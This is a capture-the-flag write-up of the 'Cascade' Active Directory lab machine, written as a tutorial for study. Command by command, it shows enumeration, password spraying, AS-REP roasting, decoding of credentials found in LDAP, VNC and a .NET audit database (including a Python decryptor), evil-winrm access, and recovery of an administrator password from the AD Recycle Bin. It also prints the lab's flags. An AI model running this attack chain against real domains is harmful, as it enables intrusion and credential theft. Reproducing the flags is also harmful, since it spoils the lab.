
## CTF Writeup: Cascade

---
## Reconnaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.55.211
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-12 14:41 -0500
Nmap scan report for 10.129.55.211
Host is up (0.017s latency).
Not shown: 65520 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-12 19:43:08Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-08-12T19:44:00
|_  start_date: 2026-08-12T19:39:51

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 200.94 seconds
```

The target seems to be an domain controller. The TCP Scan revealed the FQDN CASC-DC1.cascade.local, the domain itself cascade.local and the Hostname of the target CASC-DC1.

```
echo "10.129.55.211 casc-dc1.cascade.local cascade.local casc-dc1" | tee -a /etc/hosts
```

Tested if anonymous & guest user access is enabled & anonymous user seems to be enabled, but we can't enumerate shares!

```
nxc smb cascade.local -u '' -p '' --shares
```

But I was able to enumerate domain users!

```
nxc smb cascade.local -u '' -p '' --rid-brute > newusers.txt
```

Formatted the output accordingly for future bruteforcing purposes.

```
grep "SidTypeUser" newusers.txt | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
```

Performed ASREP-Roasting, but couldn't retrieve an TGT.

```
impacket-GetNPUsers -dc-ip 10.129.55.211 cascade.local/ -no-pass -usersfile users.txt
```

Sprayed credentials with the password as there username, but didn't get an hit.

```
nxc smb cascade.local -u users.txt -p users.txt
```

Proceeded with trying to enumerate LDAP.

```
ldapsearch -x -H ldap://10.129.55.211 -b "dc=cascade,dc=local" > ldapsearch.txt
```

Found an interesting entry for user r.thompson. Potentially an password.

```
cat ldapsearch.txt | grep -C 20 r.thompson
```

```
r.thompson:clk0bjVldmE=
```

The = hints that the password seems to be base64 encoded. Let's decode it!

```
echo "clk0bjVldmE=" | base64 -d
```

We now gained valid domain credentials.

```
r.thomposn:rY4n5eva
```

Enumerating SMB Shares revealed three non-default SMB Shares. Audit, print & Data. We only have read permissions to Data & print. Let's check them out!

```
nxc smb cascade.local -u 'r.thompson' -p 'rY4n5eva' --shares
```

Connected to Data Share.

```
smbclient \\\\10.129.55.211/Data -U r.thompson
```

Downloaded all files onto my local machine.

```
recurse ON
prompt OFF
mge *
```

We get Information about two usernames.

```
Ben
TempAdmin
```

There is an interesting registry entry called VNC Install, which provided us with information about TightVNC running on the target server!

We retrieved an interesting encoded VNC Password:

```
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
```

Utilized AI to decrypt it, since VNC uses weak encryption algorithms (DES) it's just simple obfuscation.

```
echo -n "6bcf2a4b6e5aca0f" | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | cat
sT333ve2
```

Checked the credentials and we successfully authenticated!

```
nxc smb cascade.local -u 's.smith' -p 'sT333ve2' --shares
```

Connected to the domain controller.

```
nxc winrm cascade.local -u 's.smith' -p 'sT333ve2'
```

Retrieved user.txt in C:\Users\s.smith\Desktop.

```
7e878c52f9641a55c807e5dfe04f49c0
```

## Privilege Escalation

Enumerated Groups and Permissions of the current user, but couldn't find anything interesting.

```
whoami /all
```

Enumerated the Audit SMB Share & downloaded all files onto my local machine.

```
smbclient \\\\cascade.local/Audit$ -U s.smith
recurse ON
prompt OFF
mget *
```

Found an interesting encoded password onto this .NET executable!

```
cat CascAudit.exe
```

Let's try & reverse it with ILSpy to maybe get the plaintext password.

```
./ILSpy
```

1. Selected the .exe file and it worked!

Located the main function which presented source code that decrypts the password with an key:

```
c4scadek3y654321
```

2. Opened the .dll file retrieved from the SMB Share

This revealed the encoded password. Since we now know how to decrypt the password and have the actual password, let's decrypt them with the help of AI:

1. Install this module

```
pip install pycryptodome
```

2. Run this script:

```
import sqlite3
import base64
from Crypto.Cipher import AES

def decrypt_password(encrypted_b64):
    key = b"c4scadek3y654321"
    iv = b"1tdyjCbY1Ix49842"

    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = base64.b64decode(encrypted_b64)

    plaintext = cipher.decrypt(ciphertext)

    # AES with PKCS#7 padding: remove padding
    pad_len = plaintext[-1]
    if pad_len < 1 or pad_len > 16:
        raise ValueError("Invalid padding")

    return plaintext[:-pad_len].decode("utf-8")

db_path = input("SQLite database path: ")
conn = sqlite3.connect(db_path)
cur = conn.cursor()

cur.execute("SELECT Uname, Domain, Pwd FROM LDAP")

for uname, domain, pwd in cur.fetchall():
    try:
        password = decrypt_password(pwd)
        print(f"User: {domain}\\{uname}")
        print(f"Password: {password}")
    except Exception as e:
        print(f"Failed to decrypt for {uname}: {e}")

conn.close()
```

Ran the script & gained credentials!

```
python3 decrypt.py
SQLite database path: /ctfs/htb/ad/cascade/smb/Audit/DB/Audit.db
User: cascade.local\ArkSvc
Password: w3lc0meFr31nd
```

Connected to the DC as user ArkSvc.

```
evil-winrm -i cascade.local -u ArkSvc -p 'w3lc0meFr31nd'
```

Enumerated Groups & Privileges of this user and identified that he is part of the "Ad Recycle Bin" Group. 

```
whoami /all
```

The Active Directory Recycle Bin is used to recover deleted Active Directory Objects such as Users, Groups, OU's etc. The objects keep all their properties intact while in the AD Recycle Bin, which allows them to be restored.

1. Enumerating all Objects Inside:

```
Get-ADObject -ldapfilter "(&(isDeleted=TRUE))" -IncludeDeletedObjects
```

This revealed the previously discovered TempAdmin Account! Let's restore him!

2. Checked properties of all objects and found password!

```
Get-ADObject -ldapfilter "(&(objectclass=user)(isDeleted=TRUE))" -IncludeDeletedObjects -Properties *
```

The password seems to be an base64 encoded string. Let's decode it.

```
echo "YmFDVDNyMWFOMDBkbGVz" | base64 -d
baCT3r1aN00dles
```

Since we previously also enumerated that the TempAdmin Shares the same password as the Administrator user, let's verify if we can authenticate against the DC via evil-winrm, we can!

```
nxc winrm cascade.local -u Administrator -p 'baCT3r1aN00dles'
```

Connected to CASC-DC1 as Administrator.

```
evil-winrm -i cascade.local -u Administrator -p 'baCT3r1aN00dles'
```

Retrieved root.txt in C:\Users\Administrator\Desktop.

```
0e1b467c5df2f590dfdb469aa19cca48
```